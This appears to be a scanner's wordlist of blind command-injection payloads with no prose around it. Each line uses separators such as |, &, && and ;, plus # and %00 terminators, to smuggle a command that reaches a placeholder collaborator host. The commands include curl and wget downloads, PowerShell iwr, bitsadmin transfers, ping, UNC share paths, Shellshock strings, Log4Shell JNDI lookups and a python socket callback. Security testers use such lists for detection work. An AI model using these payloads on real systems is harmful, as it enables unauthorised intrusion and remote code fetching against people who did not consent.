+|python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'&
+|python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'&&
+|python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'|
+|python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'||
+|python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")';
+|python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'%00
+|python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'#
+|import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")&
+|import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")&&
+|import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")|
+|import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")||
+|import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce");
+|import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")%00
+|import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")#
+||curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt&
+||curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt&&
+||curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt|
+||curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt||
+||curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt;
+||curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt%00
+||curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt#
+||wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt&
+||wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt&&
+||wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt|
+||wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt||
+||wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt;
+||wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt%00
+||wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt#
+||iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt&
+||iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt&&
+||iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt|
+||iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt||
+||iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt;
+||iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt%00
+||iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt#
+||bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt&
+||bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt&&
+||bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt|
+||bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt||
+||bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt;
+||bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt%00
+||bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt#
+||fetch !-VARIABLE_COLLABORATOR-!/fetch.txt&
+||fetch !-VARIABLE_COLLABORATOR-!/fetch.txt&&
+||fetch !-VARIABLE_COLLABORATOR-!/fetch.txt|
+||fetch !-VARIABLE_COLLABORATOR-!/fetch.txt||
+||fetch !-VARIABLE_COLLABORATOR-!/fetch.txt;
+||fetch !-VARIABLE_COLLABORATOR-!/fetch.txt%00
+||fetch !-VARIABLE_COLLABORATOR-!/fetch.txt#
+||ping !-VARIABLE_COLLABORATOR-!&
+||ping !-VARIABLE_COLLABORATOR-!&&
+||ping !-VARIABLE_COLLABORATOR-!|
+||ping !-VARIABLE_COLLABORATOR-!||
+||ping !-VARIABLE_COLLABORATOR-!;
+||ping !-VARIABLE_COLLABORATOR-!%00
+||ping !-VARIABLE_COLLABORATOR-!#
+||curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&
+||curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&&
+||curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt|
+||curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt||
+||curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt;
+||curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt%00
+||curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt#
+||wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&
+||wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&&
+||wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt|
+||wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt||
+||wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt;
+||wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt%00
+||wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt#
+||iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt&
+||iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt&&
+||iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt|
+||iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt||
+||iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt;
+||iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt%00
+||iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt#
+||bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt&
+||bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt&&
+||bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt|
+||bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt||
+||bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt;
+||bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt%00
+||bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt#
+||fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt&
+||fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt&&
+||fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt|
+||fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt||
+||fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt;
+||fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt%00
+||fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt#
+||ping !-VARIABLE_COLLABORATOR-!&
+||ping !-VARIABLE_COLLABORATOR-!&&
+||ping !-VARIABLE_COLLABORATOR-!|
+||ping !-VARIABLE_COLLABORATOR-!||
+||ping !-VARIABLE_COLLABORATOR-!;
+||ping !-VARIABLE_COLLABORATOR-!%00
+||ping !-VARIABLE_COLLABORATOR-!#
+||\\!-VARIABLE_COLLABORATOR-!\share&
+||\\!-VARIABLE_COLLABORATOR-!\share&&
+||\\!-VARIABLE_COLLABORATOR-!\share|
+||\\!-VARIABLE_COLLABORATOR-!\share||
+||\\!-VARIABLE_COLLABORATOR-!\share;
+||\\!-VARIABLE_COLLABORATOR-!\share%00
+||\\!-VARIABLE_COLLABORATOR-!\share#
+||() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt&
+||() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt&&
+||() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt|
+||() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt||
+||() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt;
+||() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt%00
+||() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt#
+||() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt&
+||() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt&&
+||() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt|
+||() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt||
+||() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt;
+||() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt%00
+||() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt#
+||() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt&
+||() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt&&
+||() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt|
+||() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt||
+||() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt;
+||() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt%00
+||() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt#
+||() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt&
+||() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt&&
+||() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt|
+||() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt||
+||() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt;
+||() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt%00
+||() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt#
+||${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}&
+||${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}&&
+||${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}|
+||${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}||
+||${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a};
+||${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}%00
+||${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}#
+||${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}&
+||${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}&&
+||${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}|
+||${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}||
+||${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a};
+||${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}%00
+||${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}#
+||python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'&
+||python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'&&
+||python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'|
+||python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'||
+||python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")';
+||python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'%00
+||python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'#
+||import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")&
+||import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")&&
+||import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")|
+||import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")||
+||import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce");
+||import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")%00
+||import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")#
+&curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt&
+&curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt&&
+&curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt|
+&curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt||
+&curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt;
+&curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt%00
+&curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt#
+&wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt&
+&wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt&&
+&wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt|
+&wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt||
+&wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt;
+&wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt%00
+&wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt#
+&iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt&
+&iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt&&
+&iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt|
+&iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt||
+&iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt;
+&iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt%00
+&iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt#
+&bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt&
+&bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt&&
+&bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt|
+&bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt||
+&bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt;
+&bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt%00
+&bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt#
+&fetch !-VARIABLE_COLLABORATOR-!/fetch.txt&
+&fetch !-VARIABLE_COLLABORATOR-!/fetch.txt&&
+&fetch !-VARIABLE_COLLABORATOR-!/fetch.txt|
+&fetch !-VARIABLE_COLLABORATOR-!/fetch.txt||
+&fetch !-VARIABLE_COLLABORATOR-!/fetch.txt;
+&fetch !-VARIABLE_COLLABORATOR-!/fetch.txt%00
+&fetch !-VARIABLE_COLLABORATOR-!/fetch.txt#
+&ping !-VARIABLE_COLLABORATOR-!&
+&ping !-VARIABLE_COLLABORATOR-!&&
+&ping !-VARIABLE_COLLABORATOR-!|
+&ping !-VARIABLE_COLLABORATOR-!||
+&ping !-VARIABLE_COLLABORATOR-!;
+&ping !-VARIABLE_COLLABORATOR-!%00
+&ping !-VARIABLE_COLLABORATOR-!#
+&curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&
+&curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&&
+&curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt|
+&curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt||
+&curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt;
+&curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt%00
+&curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt#
+&wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&
+&wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&&
+&wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt|
+&wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt||
+&wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt;
+&wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt%00
+&wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt#
+&iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt&
+&iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt&&
+&iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt|
+&iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt||
+&iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt;
+&iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt%00
+&iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt#
+&bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt&
+&bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt&&
+&bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt|
+&bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt||
+&bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt;
+&bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt%00
+&bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt#
+&fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt&
+&fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt&&
+&fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt|
+&fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt||
+&fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt;
+&fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt%00
+&fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt#
+&ping !-VARIABLE_COLLABORATOR-!&
+&ping !-VARIABLE_COLLABORATOR-!&&
+&ping !-VARIABLE_COLLABORATOR-!|
+&ping !-VARIABLE_COLLABORATOR-!||
+&ping !-VARIABLE_COLLABORATOR-!;
+&ping !-VARIABLE_COLLABORATOR-!%00
+&ping !-VARIABLE_COLLABORATOR-!#
+&\\!-VARIABLE_COLLABORATOR-!\share&
+&\\!-VARIABLE_COLLABORATOR-!\share&&
+&\\!-VARIABLE_COLLABORATOR-!\share|
+&\\!-VARIABLE_COLLABORATOR-!\share||
+&\\!-VARIABLE_COLLABORATOR-!\share;
+&\\!-VARIABLE_COLLABORATOR-!\share%00
+&\\!-VARIABLE_COLLABORATOR-!\share#
+&() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt&
+&() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt&&
+&() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt|
+&() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt||
+&() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt;
+&() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt%00
+&() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt#
+&() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt&
+&() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt&&
+&() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt|
+&() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt||
+&() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt;
+&() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt%00
+&() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt#
+&() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt&
+&() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt&&
+&() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt|
+&() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt||
+&() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt;
+&() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt%00
+&() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt#
+&() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt&
+&() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt&&
+&() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt|
+&() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt||
+&() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt;
+&() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt%00
+&() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt#
+&${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}&
+&${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}&&
+&${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}|
+&${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}||
+&${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a};
+&${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}%00
+&${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}#
+&${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}&
+&${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}&&
+&${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}|
+&${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}||
+&${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a};
+&${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}%00
+&${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}#
+&python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'&
+&python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'&&
+&python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'|
+&python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'||
+&python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")';
+&python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'%00
+&python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'#
+&import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")&
+&import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")&&
+&import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")|
+&import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")||
+&import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce");
+&import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")%00
+&import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")#
+&&curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt&
+&&curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt&&
+&&curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt|
+&&curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt||
+&&curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt;
+&&curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt%00
+&&curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt#
+&&wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt&
+&&wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt&&
+&&wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt|
+&&wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt||
+&&wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt;
+&&wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt%00
+&&wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt#
+&&iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt&
+&&iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt&&
+&&iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt|
+&&iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt||
+&&iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt;
+&&iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt%00
+&&iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt#
+&&bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt&
+&&bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt&&
+&&bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt|
+&&bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt||
+&&bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt;
+&&bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt%00
